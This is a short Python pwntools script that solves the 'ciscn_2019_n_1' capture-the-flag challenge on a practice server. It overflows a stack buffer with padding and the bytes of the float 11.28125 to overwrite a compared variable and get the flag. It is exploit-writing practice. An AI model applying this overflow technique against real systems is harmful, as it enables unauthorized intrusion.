from pwn import *

# 0x41348000 = 11.28125

# p = process('./ciscn_2019_n_1')
p = remote('node3.buuoj.cn',26941)

p.recv()
payload = 'a'*(0x30-0x4) + p64(0x41348000)
p.sendline(payload)
sleep(1)	# Prevent string read failure
print p.recv()
